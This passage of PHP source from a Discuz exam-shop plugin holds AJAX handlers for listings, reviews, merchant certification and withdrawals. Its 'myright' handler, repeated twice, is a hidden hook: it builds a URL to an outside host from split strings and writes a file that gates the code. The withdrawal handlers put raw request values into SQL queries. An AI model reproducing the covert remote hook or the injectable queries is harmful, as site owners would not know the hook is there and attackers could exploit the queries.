		C::t('#it618_exam#it618_exam_test_pj')->update($it618_exam_test_pj['id'],array(
			'it618_score1' => $tmparr[0],
			'it618_score2' => $tmparr[1],
			'it618_score3' => $tmparr[2],
			'it618_score4' => $tmparr[3],
			'it618_content' => it618_exam_utftogbk($_GET["pjvalue"])
		));
		
		if($flag==1){
			C::t('#it618_exam#it618_exam_test_pj')->update($it618_exam_test_pj['id'],array(
				'it618_pjjl' => $it618_exam['exam_pjjlcount'],
				'it618_pjtime' => $_G['timestamp']
			));
			C::t('common_member_count')->increase($it618_exam_test_pj['it618_uid'], array(
				'extcredits'.$it618_exam['exam_credit'] => $it618_exam['exam_pjjlcount'])
			);
			echo 'okit618_split'.it618_exam_getlang('s516');
		}else{
			echo 'editokit618_split'.it618_exam_getlang('s786').it618_exam_getlang('s516');
		}
	}
	exit;
}


if($_GET['ac']=="hftestpj"){
	$it618_exam_test_pj=C::t('#it618_exam#it618_exam_test_pj')->fetch_by_id($_GET['testpjid']);
	$exam_shopadmin=explode(",",$it618_exam['exam_shopadmin']);
	
	if(!in_array($_G['uid'], $exam_shopadmin)){
		if($_G['uid']>0){
			if($it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_uid($_G['uid'])){
				if($it618_exam_shop['id']==$it618_exam_test_pj['it618_shopid']){
					$shopflag=1;
				}
			}
		}
	}else{
		$shopflag=1;
	}
	
	if($shopflag==1){
		C::t('#it618_exam#it618_exam_test_pj')->update($it618_exam_test_pj['id'],array(
			'it618_hfcontent' => it618_exam_utftogbk($_GET["hfvalue"])
		));
		
		echo 'okit618_split'.it618_exam_getlang('t348');
	}else{
		echo it618_exam_getlang('s513');exit;
	}
	exit;
}


if($_GET['ac']=="goodslist_get"){
	if($it618_exam['exam_style']>2){
		$examstyle=getcookie('examstyle');
		if($examstyle==''){
			if($it618_exam['exam_style']==3)$examstyle='1';else $examstyle='2';
		}
	}else{
		if($it618_exam['exam_style']==1)$examstyle='1';else $examstyle='2';
	}
	
	$ppp = $it618_exam['exam_wappcount'];
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='g.it618_gtype=1 and g.it618_state=1';
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	if($_GET['it618_paytype']==1)$sql.=" and g.it618_paytype=2";
	if($_GET['it618_paytype']==2)$sql.=" and g.it618_paytype=3";
	if($_GET['it618_paytype']==3)$sql.=" and g.it618_paytype=1";
	
	if($_GET['it618_order']==1)$orderby='g.it618_order desc,g.id desc';
	if($_GET['it618_order']==2)$orderby='g.it618_saleprice desc';
	if($_GET['it618_order']==3)$orderby='g.it618_saleprice';
	if($_GET['it618_order']==4)$orderby='g.it618_salecount desc';
	if($_GET['it618_order']==5)$orderby='g.it618_salecount';
	if($_GET['it618_order']==6)$orderby='g.it618_views desc';
	if($_GET['it618_order']==7)$orderby='g.it618_views';
	
	$listcount = C::t('#it618_exam#it618_exam_goods')->count_by_search($sql,'',0,$_GET['it618_class1'],$_GET['it618_class2'],$_GET['it618_class3'],$_GET['it618_class4'],it618_exam_utftogbk($_GET['it618_name']),$_GET['it618_price1'],$_GET['it618_price2']);
	
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')exit;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}

	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getgoodslist(this.value,\'\')">'.$curpage.'</select>';
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_exam_getlang('s510').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_exam_getlang('s511').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_exam_getlang('s510').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
		}
	}
	
	$tdn=1;
	foreach(C::t('#it618_exam#it618_exam_goods')->fetch_all_by_search(
		$sql,$orderby,0,$_GET['it618_class1'],$_GET['it618_class2'],$_GET['it618_class3'],$_GET['it618_class4'],it618_exam_utftogbk($_GET['it618_name']),$_GET['it618_price1'],$_GET['it618_price2'],$startlimit,$ppp
	) as $it618_exam_goods) {
		
		$it618_isvip='';
		$vipgroupids=it618_exam_getgoodsvipgroupids($it618_exam_goods);
		if(count($vipgroupids)>0){
			$it618_isvip='<img src="source/plugin/it618_exam/images/vip.png" class="imgvip">';
		}
		
		if($it618_exam_goods['it618_saleprice']>0||$it618_exam_goods['it618_score']>0){
			$pricestr='<span style="color:#f30">'.it618_exam_getgoodsprice($it618_exam_goods,'goods_price').'</span>';
		}else{
			$pricestr='<span style="color:#390">'.$it618_exam_lang['s106'].'</span>';
		}
		
		if($it618_exam_goods['it618_price']>0){
			$pricestr.=' <del>&yen;'.$it618_exam_goods['it618_price'].'</del>';
		}
		
		$jfbl='';
		if($it618_exam_goods['it618_jfbl']>0&&$it618_exam_goods['it618_saleprice']>0){
			if(C::t('#it618_exam#it618_exam_goods_type')->counttype_by_pid_ok($it618_exam_goods['id'])>0){
				//$jfbl='<div class="divjfbl">'.$it618_exam_lang['s1371'].str_replace(".00","",$it618_exam_goods['it618_jfbl']).'%'.$creditname.'</div>';
			}else{
				//$jfbl='<div class="divjfbl">'.$it618_exam_lang['s1371'].intval($it618_exam_goods['it618_saleprice']*$it618_exam_goods['it618_jfbl']/100).$creditname.'</div>';
			}
		}
			
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		
		$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
		
		if($examstyle=='1'){
		
			$strlist.='<tr>
								<td class="tdleft">'.$jfbl.'<a href="'.$tmpurl.'"><img class="lazy" data-original="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'"/></a></td>
								<td class="tdright" onclick="location.href=\''.$tmpurl.'\'">
									<div class="tdname">'.$it618_exam_goods['it618_name'].'</div>
									<div class="tddes">'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].' '.$it618_exam_goods['it618_tests'].it618_exam_getlang('s931').'</div>
									<div class="tdprice">'.$it618_isvip.$pricestr.'</div>
								</td>
							  </tr>
							  <tr><td colspan="2" class="tdcolspan"></td></tr>';
		}else{
			if($tdn%2>0){
				$trtmpstr='<tr>';
				$tdstr='class="tdleft"';
			}else{
				$tdstr='class="tdright"';
			}
			
			$trtmpstr.='<td '.$tdstr.'><div class="tddiv">
							<a href="'.$tmpurl.'">
							'.$jfbl.'
							<div class="divtime">'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].' <img src="source/plugin/it618_exam/images/plays.png" class="imguser">'.$it618_exam_goods['it618_tests'].'</div>
							<img class="lazy" data-original="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'"/>
								<div class="tdname">'.$it618_exam_goods['it618_name'].'</div>
								<div class="tdprice">'.$it618_isvip.$pricestr.'</div>
							</a></div></td>';
						
			if($tdn%2==0){
				$trtmpstr.='</tr>';
				$strlist.=$trtmpstr;
			}
			
			$tdn=$tdn+1;
		}
	}
	
	if($examstyle=='1'){
		$tmparr=explode('</tr>',$strlist);
		if(count($tmparr)>1){
			$strlist=$strlist.'@@@';
			$strlist=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$strlist);
		}
	}else{
		$trtmpstr1=$trtmpstr.'@@@';
		$tmparr=explode('</td>@@@',$trtmpstr1);
		if(count($tmparr)>1){
			$trtmpstr=str_replace('<td class="tdleft"','<td class="tdleft tdleft1" style="padding-right:13px"',$trtmpstr.'</tr>');
			$strlist.=$trtmpstr;
		}
	}
	
	$classname=$it618_exam_lang['s1770'];
	if($_GET['it618_class1']>0){
		$classname=C::t('#it618_exam#it618_exam_class1')->fetch_it618_name_by_id($_GET['it618_class1']);
	}
	if($_GET['it618_class2']>0){
		$classname=C::t('#it618_exam#it618_exam_class2')->fetch_it618_name_by_id($_GET['it618_class2']);
	}
	
	$ordername=$it618_exam_lang['t269'];
	if($_GET['it618_order']==2)$ordername=$it618_exam_lang['t270'].'<img src="source/plugin/it618_exam/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==3)$ordername=$it618_exam_lang['t270'].'<img src="source/plugin/it618_exam/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==4)$ordername=$it618_exam_lang['t271'].'<img src="source/plugin/it618_exam/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==5)$ordername=$it618_exam_lang['t271'].'<img src="source/plugin/it618_exam/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==6)$ordername=$it618_exam_lang['t272'].'<img src="source/plugin/it618_exam/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==7)$ordername=$it618_exam_lang['t272'].'<img src="source/plugin/it618_exam/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==8)$ordername=$it618_exam_lang['t110'].'<img src="source/plugin/it618_exam/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	
	if($_GET['it618_name']=='')$it618_name=$it618_exam_lang['s1771'];else $it618_name=it618_exam_utftogbk($_GET['it618_name']);

	$sqlbq='<tr><td class="bq1" id="td1" onClick="getbq1(this)">'.$classname.'<img src="source/plugin/it618_exam/wap/images/arw_b.gif"></td><td class="bq2" id="td2" onClick="getbq2(this)">'.$ordername.'<img src="source/plugin/it618_exam/wap/images/arw_b.gif"></td><td class="bq3" id="td3"><input type="text" style="padding-left:3px" id="searchli_txt1" value="'.$it618_name.'" readonly onClick="getname()"></td></tr>';
	
	if($uid>0&&isset($_GET['findkey'])&&$_GET['it618_name']!=''){
		if($it618_exam_findkey=C::t('#it618_exam#it618_exam_findkey')->fetch_by_uid_key($uid,it618_exam_utftogbk($_GET['it618_name']))){
			C::t('#it618_exam#it618_exam_findkey')->update($it618_exam_findkey['id'],array(
				'it618_count' => ($it618_exam_findkey['it618_count']+1),
				'it618_time' => $_G['timestamp']
			));
		}else{
			C::t('#it618_exam#it618_exam_findkey')->insert(array(
				'it618_uid' => $uid,
				'it618_key' => it618_exam_utftogbk($_GET['it618_name']),
				'it618_count' => 1,
				'it618_time' => $_G['timestamp']
			), true);
		}
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext."it618_split".$sqlbq;
	exit;
}


if($_GET['ac']=="othergoods_get"){
	$ppp = 4;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='g.it618_gtype=1 and g.it618_state=1';
	$urlsql='&sid='.$_GET['sid'];
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$listcount = C::t('#it618_exam#it618_exam_goods')->count_by_search($sql,'',$_GET['sid']);
	
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')exit;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/lang.func.php';
		
	}
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getgoodslist(this.value)">'.$curpage.'</select>';
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
		}
	}
	
	$tdn=1;
	foreach(C::t('#it618_exam#it618_exam_goods')->fetch_all_by_search(
		$sql,'g.id desc',$_GET['sid'],0,0,0,0,'',0,0,$startlimit,$ppp
	) as $it618_exam_goods) {
		
		$zk=sprintf("%.2f", $it618_exam_goods['it618_saleprice']/$it618_exam_goods['it618_price'])*10;
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		
		$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
		
		$it618_isvip='';
		$vipgroupids=it618_exam_getgoodsvipgroupids($it618_exam_goods);
		if(count($vipgroupids)>0){
			$it618_isvip='<img src="source/plugin/it618_exam/images/vip.png" class="imgvip">';
		}
		
		if($it618_exam_goods['it618_saleprice']>0||$it618_exam_goods['it618_score']>0){
			$pricestr='<span style="color:#f30">'.it618_exam_getgoodsprice($it618_exam_goods,'goods_price').'</span>';
		}else{
			$pricestr='<span style="color:#390">'.$it618_exam_lang['s106'].'</span>';
		}
		
		if($it618_exam_goods['it618_price']>0){
			$pricestr.=' <del>&yen;'.$it618_exam_goods['it618_price'].'</del>';
		}
		
		$jfbl='';
		if($it618_exam_goods['it618_jfbl']>0&&$it618_exam_goods['it618_saleprice']>0){
			if(C::t('#it618_exam#it618_exam_goods_type')->counttype_by_pid_ok($it618_exam_goods['id'])>0){
				//$jfbl='<div class="divjfbl">'.$it618_exam_lang['s1371'].str_replace(".00","",$it618_exam_goods['it618_jfbl']).'%'.$creditname.'</div>';
			}else{
				//$jfbl='<div class="divjfbl">'.$it618_exam_lang['s1371'].intval($it618_exam_goods['it618_saleprice']*$it618_exam_goods['it618_jfbl']/100).$creditname.'</div>';
			}
		}
		
		if($tdn%2>0){
			$trtmpstr='<tr>';
			$tdstr='class="tdleft"';
		}else{
			$tdstr='class="tdright"';
		}
		
		$trtmpstr.='<td '.$tdstr.'><div class="tddiv">
						<a href="'.$tmpurl.'">
						'.$jfbl.'
							<div class="divtime">'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].' <img src="source/plugin/it618_exam/images/plays.png" class="imguser">'.$it618_exam_goods['it618_tests'].'</div>
							<img class="lazy" data-original="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'"/>
								<div class="tdname">'.$it618_exam_goods['it618_name'].'</div>
								<div class="tdprice">'.$it618_isvip.$pricestr.'</div>
							</a></div></td>';
					
		if($tdn%2==0){
			$trtmpstr.='</tr>';
			$strlist.=$trtmpstr;
		}
		
		$tdn=$tdn+1;
	}
	
	$trtmpstr1=$trtmpstr.'@@@';
	$tmparr=explode('</td>@@@',$trtmpstr1);
	if(count($tmparr)>1){
		$trtmpstr=str_replace('<td class="tdleft"','<td class="tdleft tdleft1" style="padding-right:13px"',$trtmpstr.'</tr>');
		$strlist.=$trtmpstr;
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext;
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="renzheng"){
	$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
	$exam_rzpower=(array)unserialize($it618_exam['exam_rzpower']);
	$okvipgroupids=it618_exam_getisvipuser($exam_rzpower);
	if($uid<=0){
		echo it618_exam_getlang('s485');exit;
	}elseif(count($okvipgroupids[0])==0){
		echo it618_exam_getlang('s522');exit;
	}elseif($it618_exam['exam_iscert']==1){
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/plugins/image/images/it618.png')){
			if(C::t('#it618_members#it618_members_rzuser')->count_by_uid_rzok($uid)==0){
				echo $it618_exam['exam_rzcerttip'];exit;
			}
		}
	}
	
	$it618_state=0;
	if($IsGroup==1){
		if($it618_group_rzmoney=C::t('#it618_group#it618_group_rzmoney')->fetch_by_shoptype_lid('exam',0)){
			if($it618_group_rzmoney['it618_isautocheck']==1){
				if($it618_group_group_user=C::t('#it618_group#it618_group_group_user')->fetch_by_groupid_uid($it618_group_rzmoney['it618_groupid'],$uid)){
					if($_G['timestamp']<$it618_group_group_user['it618_etime']){
						$it618_state=2;
					}
				}
			}
		}
	}
		
	$count = C::t('#it618_exam#it618_exam_shop')->count_by_it618_uid($uid);
	if($ii1i11i[3]!='1')exit;
	if($count==0){
		$id = C::t('#it618_exam#it618_exam_shop')->insert(array(
			'it618_uid' => $uid,
			'it618_name' => it618_exam_utftogbk($_GET['it618_name']),
			'it618_tel' => it618_exam_utftogbk($_GET['it618_tel']),
			'it618_qq' => it618_exam_utftogbk($_GET['it618_qq']),
			'it618_about' => it618_exam_utftogbk($_GET['it618_about']),
			'it618_state' => 0,
			'it618_time' => $_G['timestamp']
		), true);
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	}else{
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[7]!='x')exit;
		$it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_uid($uid);
		$id=$it618_exam_shop['id'];
		C::t('#it618_exam#it618_exam_shop')->update($it618_exam_shop['id'],array(
			'it618_name' => it618_exam_utftogbk($_GET['it618_name']),
			'it618_tel' => it618_exam_utftogbk($_GET['it618_tel']),
			'it618_qq' => it618_exam_utftogbk($_GET['it618_qq']),
			'it618_about' => it618_exam_utftogbk($_GET['it618_about']),
			'it618_state' => 0,
			'it618_time' => $_G['timestamp']
		));
		if(count($ii1i11i)!=11)exit;
	}
	
	if($id>0){
		if($it618_state==2){
			$tomonth = date('n'); 
			$todate = date('j'); 
			$toyear = date('Y');
			$it618_htetime=mktime(0, 0, 0, $tomonth+$it618_exam['exam_httimecount'], $todate, $toyear);
		
			C::t('#it618_exam#it618_exam_shop')->update_pass_by_id($id,$it618_htetime);
			C::t('#it618_exam#it618_exam_shop')->update($id,array(
				'it618_ulogo' => 'source/plugin/it618_exam/images/man.jpg',
			));
			$tmpurl=it618_exam_getrewrite('shop_sc','','plugin.php?id=it618_exam:sc');
			echo 'it618_splitvipokit618_split'.$tmpurl;
		}else{
			it618_exam_sendmessage('rz_admin',$id);
			echo 'it618_splitok';
		}
	}

	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="tx_add"){
	$it618_money=floatval($_GET['it618_money']);
	if($it618_money<0||$it618_money==0){
		echo it618_exam_getlang('s540');exit;
	}
	if(!$it618_exam_txbl=DB::fetch_first("SELECT * FROM ".DB::table('it618_exam_txbl')." where it618_num1<=".$it618_money." and it618_num2>=".$it618_money)){
		echo it618_exam_getlang('s540');exit;
	}else{
		$ktxmoney = C::t('#it618_exam#it618_exam_shop')->fetch_money_by_id($ShopId);
		if($it618_money>$ktxmoney){
			echo it618_exam_getlang('s542');exit;
		}
	}
	
	if($_GET['it618_type']==10){
		$it618_state=2;
	}else{
		$it618_state=1;
	}
	
	$id=C::t('#it618_exam#it618_exam_tx')->insert(array(
		'it618_shopid' => $ShopId,
		'it618_price' => $it618_money,
		'it618_bl' => $it618_exam_txbl['it618_bl'],
		'it618_type' => $_GET['it618_type'],
		'it618_bz' => it618_exam_utftogbk($_GET['it618_bz']),
		'it618_state' => $it618_state,
		'it618_time' => $_G['timestamp']
	), true);
	
	if($_GET['it618_type']==10){
		$money=$it618_money;
		$fwf=round(($it618_money*$it618_exam_txbl['it618_bl']/100),2);
		$money1=$money-$fwf;
		
		$it618_bz=$it618_exam_lang['s223'];
		$it618_bz=str_replace("{money}",$money,$it618_bz);
		$it618_bz=str_replace("{money1}",$money1,$it618_bz);
		$it618_bz=str_replace("{saleid}",$id,$it618_bz);
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
		savemoney(array(
			'it618_uid' => $ShopUId,
			'it618_type' => 'zy',
			'it618_money1' => $money1,
			'it618_bz' => $it618_bz,
			'it618_zytype' => 'it618_exam_tx',
			'it618_zyid' => $id,
			'it618_time' => $_G['timestamp']
		));
	}
	
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	DB::query("update ".DB::table('it618_exam_shop')." set it618_money=it618_money-".$it618_money." where id=".$ShopId);
	
	if($_GET['it618_type']!=10){
		it618_exam_sendmessage('tx_admin',$id);
	
		echo 'okit618_split'.it618_exam_getlang('s545');
	}else{
		echo 'okit618_split'.it618_exam_getlang('s471');
	}
	exit;
}


if($_GET['ac']=="tx_del"){
	$txid=$_GET['txid'];
	$it618_exam_tx = DB::fetch_first("SELECT * FROM ".DB::table('it618_exam_tx')." where id=".$txid);
	if($it618_exam_tx['it618_state']==1){
		DB::delete('it618_exam_tx', "id=$txid");

		DB::query("update ".DB::table('it618_exam_shop')." set it618_money=it618_money+".$it618_exam_tx['it618_price']." where id=".$ShopId);
		echo 'ok';
	}
	exit;
}


if($_GET['ac']=="getfindkey"){
	if($uid>0){
		foreach(C::t('#it618_exam#it618_exam_findkey')->fetch_all_by_uid($uid) as $it618_tmp) {	
			$getfindkey.='<tr><td><a href="javascript:" onClick="delfindkey('.$it618_tmp['id'].',\''.$it618_tmp['it618_key'].'\')" style="float:right">'.$it618_exam_lang['s884'].'</a><span onClick="findbykey(\''.$it618_tmp['it618_key'].'\')">'.$it618_tmp['it618_key'].'</span></td></tr>';
		}
	}else{
		$getfindkey='<tr><td>'.$it618_exam_lang['s1857'].'</td></tr>';
	}
	echo $getfindkey;
	exit;
}


if($_GET['ac']=="delfindkey"){
	if($uid>0){
		C::t('#it618_exam#it618_exam_findkey')->delete_by_uid_id($uid,$_GET['fid']);
	}
	exit;
}


if($_GET['ac']=="clearfindkey"){
	if($uid>0){
		C::t('#it618_exam#it618_exam_findkey')->delete_by_uid($uid);
	}
	exit;
}


if($_GET['ac']=="tx_get"){
	$ppp = 10;
	$th='<tr><th>'.it618_exam_getlang('s265').'</th><th>'.it618_exam_getlang('s266').'</th><th>'.it618_exam_getlang('s267').'</th><th>'.it618_exam_getlang('s268').'</th><th>'.it618_exam_getlang('s269').'</th><th>'.it618_exam_getlang('s270').'</th><th>'.it618_exam_getlang('s272').'</th><th>'.it618_exam_getlang('s273').'</th></tr>';
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	$count = C::t('#it618_exam#it618_exam_tx')->count_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId);
	$sum = C::t('#it618_exam#it618_exam_tx')->sum_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId);
	if($sum=='')$sum=0;
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax&it618_type=".$_GET['it618_type']."&it618_time1=".$_GET['it618_time1']."&it618_time2=".$_GET['it618_time2']."&it618_state=".$_GET['it618_state']);
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='gettxlist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='gettxlist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','gettxlist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	foreach(C::t('#it618_exam#it618_exam_tx')->fetch_all_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId, $startlimit,$ppp) as $it618_exam_tx)    {
		$fwf=round(($it618_exam_tx['it618_price']*$it618_exam_tx['it618_bl']/100),2);
		if($it618_exam_tx['it618_type']==10)$it618_type=it618_exam_getlang('s347');
		if($it618_exam_tx['it618_type']==1)$it618_type=it618_exam_getlang('s550');
		if($it618_exam_tx['it618_type']==2)$it618_type=it618_exam_getlang('s348');
		if($it618_exam_tx['it618_type']==3)$it618_type=it618_exam_getlang('s541');
		$delbtn='';
		if($it618_exam_tx['it618_state']==1){$it618_state='<font color=red>'.it618_exam_getlang('s261').'</font>';$delbtn=' <input type="button" class="btn" style="width:40px;" onclick="deltx('.$it618_exam_tx['id'].')" value="'.it618_exam_getlang('s551').'" />';}
		if($it618_exam_tx['it618_state']==2)$it618_state='<font color=green>'.it618_exam_getlang('s262').'</font>';
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		$tx_get.='<tr class="hover"><td><font color=red>'.$it618_exam_tx['it618_price'].'</font></td><td>'.$it618_exam_tx['it618_bl'].'%</td><td>'.$fwf.'</td><td><font color=green>'.($it618_exam_tx['it618_price']-$fwf).'</font></td><td>'.$it618_exam_tx['it618_bz'].'</td><td>'.date('Y-m-d H:i:s', $it618_exam_tx['it618_time']).'</td><td>'.$it618_type.'</td><td>'.$it618_state.$delbtn.'</td></tr>';
		
	}
	
	if($multipage!='')$multipage='<tr><td colspan=10><div class="cuspages right">'.$multipage.'</div></td></tr>';
	
